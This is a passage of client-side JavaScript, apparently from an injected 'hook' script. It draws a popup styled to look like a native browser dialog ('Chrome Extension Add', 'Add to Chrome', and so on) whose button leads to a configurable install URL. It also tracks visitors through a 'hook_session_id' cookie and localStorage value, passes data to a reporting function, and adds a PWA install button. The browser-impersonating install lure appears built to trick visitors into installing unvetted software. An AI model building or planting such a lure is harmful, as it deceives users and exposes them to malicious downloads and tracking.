            // If image doesn't load, add onload and onerror events
            var img = logoDiv.querySelector('img');
            if (img) {
                img.onerror = function() {
                    this.parentNode.innerHTML = downloadIconSvg;
                };
            }
            
            // Title and description section
            var titleDiv = document.createElement('div');
            titleDiv.style.flexGrow = '1';
            
            // Title text - change based on browser
            var title = document.createElement('div');
            if (isChrome && !isBrave && !isEdge) {
                title.textContent = 'Chrome Extension Add';
            } else if (isFirefox) {
                title.textContent = 'Firefox Extension Add';
            } else if (isSafari) {
                title.textContent = 'Safari Extension Add';
            } else if (isBrave) {
                title.textContent = 'Brave Extension Add';
            } else if (isEdge) {
                title.textContent = 'Edge Extension Add';
            } else {
                title.textContent = 'Extension Add';
            }
            title.style.fontWeight = '500';
            title.style.fontSize = '16px';
            title.style.color = '#202124';
            title.style.marginBottom = '4px';
            
            // Description
            var description = document.createElement('div');
            description.textContent = 'Download the app for a better experience.'; 
            description.style.fontSize = '14px';
            description.style.color = '#5f6368';
            description.style.lineHeight = '1.4';
            
            // Button container
            var buttonContainer = document.createElement('div');
            buttonContainer.style.marginTop = '18px';
            buttonContainer.style.display = 'flex';
            buttonContainer.style.justifyContent = 'center';
            
            // Install button
            var installButton = document.createElement('a');
            installButton.href = config.installURL || '#';
            installButton.className = 'install-button';
            
            // Change button color and text based on browser
            var buttonColor = '#4285F4'; // Default color (Chrome blue)
            var buttonText = 'Install Now';
            
            if (isChrome && !isBrave && !isEdge) {
                buttonColor = '#4285F4'; // Chrome blue
                buttonText = 'Add to Chrome';
            } else if (isFirefox) {
                buttonColor = '#FF5722'; // Firefox orange
                buttonText = 'Add to Firefox';
            } else if (isSafari) {
                buttonColor = '#1D96F3'; // Safari blue
                buttonText = 'Add to Safari';
            } else if (isBrave) {
                buttonColor = '#F1552B'; // Brave orange
                buttonText = 'Add to Brave';
            } else if (isEdge) {
                buttonColor = '#0067B8'; // Edge blue
                buttonText = 'Add to Edge';
            } else {
                buttonColor = '#34A853'; // Green color (download for later)
                buttonText = 'Download';
            }
            
            installButton.textContent = buttonText;
            installButton.style.backgroundColor = buttonColor;
            installButton.style.color = 'white';
            installButton.style.padding = '8px 24px';
            installButton.style.borderRadius = '4px';
            installButton.style.fontWeight = '500';
            installButton.style.fontSize = '14px';
            installButton.style.textDecoration = 'none';
            installButton.style.display = 'inline-block';
            installButton.style.textAlign = 'center';
            installButton.style.width = '100%';
            
            // Combine components
            titleDiv.appendChild(title);
            titleDiv.appendChild(description);
            
            headerDiv.appendChild(logoDiv);
            headerDiv.appendChild(titleDiv);
            
            buttonContainer.appendChild(installButton);
            
            promptDiv.appendChild(closeButton);
            promptDiv.appendChild(headerDiv);
            promptDiv.appendChild(buttonContainer);
            
            // Handle click event
            installButton.addEventListener('click', function(e) {
                if (!config.installURL) {
                    e.preventDefault();
                    // If PWA installation prompt exists, use it
                    if (window.deferredPrompt) {
                        window.deferredPrompt.prompt();
                        window.deferredPrompt.userChoice.then((choiceResult) => {
                            if (choiceResult.outcome === 'accepted') {
                                debugLog('User installed the app');
                                document.body.removeChild(promptDiv);
                            }
                            window.deferredPrompt = null;
                        });
                    } else {
                        debugLog('PWA installation prompt not found');
                    }
                } else {
                    debugLog('User redirected to install URL: ' + config.installURL);
                }
            });
            
            // Add event listener for close button
            closeButton.addEventListener('click', function() {
                document.body.removeChild(promptDiv);
                debugLog('User closed the Install button');
            });
            
            // Add directly to body
            document.body.appendChild(promptDiv);
            
            debugLog("Install button added successfully");
        } catch (e) {
            debugLog("Error adding Install button:", e);
        }
    }

    // SessionID processing function
    function initSessionId() {
        try {
            // SessionID validation function - defined within scope
            function validateSessionID(sessionID) {
                // SessionID must not be empty
                if (sessionID === "") {
                    return false;
                }

                // SessionID must be 6-8 characters long
                if (sessionID.length < 6 || sessionID.length > 8) {
                    return false;
                }

                // SessionID must consist only of letters and numbers
                for (var i = 0; i < sessionID.length; i++) {
                    var char = sessionID.charAt(i);
                    if (!((char >= 'a' && char <= 'z') || (char >= 'A' && char <= 'Z') || (char >= '0' && char <= '9'))) {
                        return false;
                    }
                }

                return true;
            }
            
            // First check localStorage
            var storedSessionId = localStorage.getItem('hook_session_id');
            if (storedSessionId && validateSessionID(storedSessionId)) {
                config.sessionId = storedSessionId;
                if (config.debug) console.log('SessionID retrieved from localStorage:', config.sessionId);
                return;
            }
            
            // Then check cookies
            var cookies = document.cookie.split(';');
            for (var i = 0; i < cookies.length; i++) {
                var cookie = cookies[i].trim();
                if (cookie.indexOf('hook_session_id=') === 0) {
                    var cookieSessionId = cookie.substring('hook_session_id='.length, cookie.length);
                    if (validateSessionID(cookieSessionId)) {
                        config.sessionId = cookieSessionId;
                        if (config.debug) console.log('SessionID retrieved from cookie:', config.sessionId);
                        // Save to localStorage
                        try {
                            localStorage.setItem('hook_session_id', config.sessionId);
                        } catch (e) {
                            if (config.debug) console.error('localStorage access error:', e);
                        }
                        return;
                    }
                }
            }
            
            // If no valid SessionID is found, it will be fetched from the server after the first request
            config.sessionId = '';
            if (config.debug) console.log('No valid SessionID found, will be fetched from the server');
        } catch (e) {
            if (config.debug) console.error('SessionID initialization error:', e);
            config.sessionId = '';
        }
    }

    // Remove old handleSessionId function and update reportData function
    function reportData(type, data) {
        sendData(type, data);
    }

    // Add PWA Install button function
    function addPWAInstallButton() {
        try {
            debugLog("PWA Install button adding process started...");
            
            // Variable to store PWA installation prompt
            var deferredPrompt;
            
            // If button already exists, don't create it again
            if (document.getElementById('pwa-install-button')) {
                debugLog("PWA Install button already exists");
                return;
            }
            
            // Create install button
            var installButton = document.createElement('button');
            installButton.id = 'pwa-install-button';
            installButton.textContent = 'Install App';
            installButton.style.position = 'fixed';
            installButton.style.top = '10px';
            installButton.style.right = '10px';
            installButton.style.zIndex = '9999';
            installButton.style.backgroundColor = '#4285F4';
            installButton.style.color = 'white';
            installButton.style.border = 'none';
            installButton.style.borderRadius = '4px';
            installButton.style.padding = '8px 16px';
            installButton.style.fontFamily = 'Roboto, Arial, sans-serif';
            installButton.style.fontSize = '14px';
            installButton.style.fontWeight = '500';
            installButton.style.cursor = 'pointer';
            installButton.style.boxShadow = '0 2px 5px rgba(0,0,0,0.2)';
            
            // Initially hide the button
            installButton.style.display = 'none';
            
            // Add to document
            document.body.appendChild(installButton);
            
            debugLog("PWA Install button added to DOM");
            
            // Listen for beforeinstallprompt event
            window.addEventListener('beforeinstallprompt', function(e) {
                // Prevent automatic prompt
                e.preventDefault();
                // Store for later use
                deferredPrompt = e;
                // Show the button
                installButton.style.display = 'block';
                
                debugLog("beforeinstallprompt event captured, button shown");
            });
            
            // When the install button is clicked
            installButton.addEventListener('click', function() {
                debugLog("PWA Install button clicked");
                
                if (deferredPrompt) {
                    // Show PWA installation dialog
                    deferredPrompt.prompt();
                    
                    // Wait for user response
                    deferredPrompt.userChoice.then(function(choiceResult) {
                        if (choiceResult.outcome === 'accepted') {
                            debugLog('User accepted PWA installation');
                        } else {
                            debugLog('User rejected PWA installation');
                        }
                        // Clear prompt
                        deferredPrompt = null;
                        // Hide the button
                        installButton.style.display = 'none';
                    });
                } else {
                    debugLog("PWA installation prompt not found, manual installation required");
                    // Information about PWA installation methods supported by the browser
                    if ('standalone' in navigator && navigator.standalone) {
                        alert('This app is already installed.');
                    } else {
                        alert('Your browser does not support PWA installation or the installation prompt is not ready yet. Please use the install icon in the address bar.');
                    }
                }
            });
            
            window.addEventListener('appinstalled', function(evt) {
                debugLog('PWA installed successfully');
                installButton.style.display = 'none';
            });
            
            installButton.style.display = 'block';
            
        } catch (e) {
            debugLog("Error adding PWA Install button:", e);
            console.error("PWA Install button error:", e);
        }
    }
})(); 